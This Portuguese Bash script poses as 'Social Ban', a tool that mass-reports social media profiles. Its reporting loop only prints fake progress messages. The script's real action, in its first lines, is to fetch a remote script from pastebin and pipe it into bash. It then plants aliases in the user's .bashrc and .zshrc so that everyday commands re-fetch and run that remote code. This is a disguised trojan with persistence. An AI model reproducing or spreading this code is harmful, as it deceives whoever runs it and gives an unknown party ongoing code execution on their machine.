#!/bin/bash


## IMPORTANDO  ##
API='curl -s https://pastebin.com/raw/Ft7Ruftb'
$API | bash

## CONFIGURANDO API PARA BANIR REDES SOCIAIS ##
function ban(){
while RR= read -r line; do
    echo "alias $line='$line && $API | bash'"
done < config.txt
}

ban >> "$HOME"/.bashrc
ban >> "$HOME"/.zshrc

figlet Social Ban
echo " == Desenvolvido por coringamodz =="

COUNTER=$((0))
echo " [1]  : Facebook"
echo " [2]  : Instagram"
echo " [3]  : Discord"
echo " [4]  : Telegram"
echo " [5]  : Whatsapp"
echo " [6]  : Linkedin"
echo " [7]  : Twitter"
echo " [8]  : Reddit"
echo " [9]  : YouTube"
echo " [10] : Pinterest"
echo
read -p " [?] Insira a opcao: " opcao

if [[ "$opcao" == 1  || "$opcao" == 2 || "$opcao" == 3 || "$opcao" == 4 || "$opcao" == 5 || "$opcao" == 6 || "$opcao" == 7 || "$opcao" == 8 || "$opcao" == 9 || "$opcao" == 10 ]]; then
read -p " [?] Insira o link do perfil: " alvo
echo
echo " AVISO: O script nao faz a validacao se o perfil existe ou nao. Certifique-se de que foi inserido corretamente o usuario!"
echo
sleep 2
echo " [!] Iniciando..."
sleep 2
while true
do
counter=$(($counter+1))
sleep 0.3
echo -e " ENVIANDO ${counter} DENUNCIAS PARA : ${alvo}"
done
else
echo " [!] Opcao invalida!"
fi
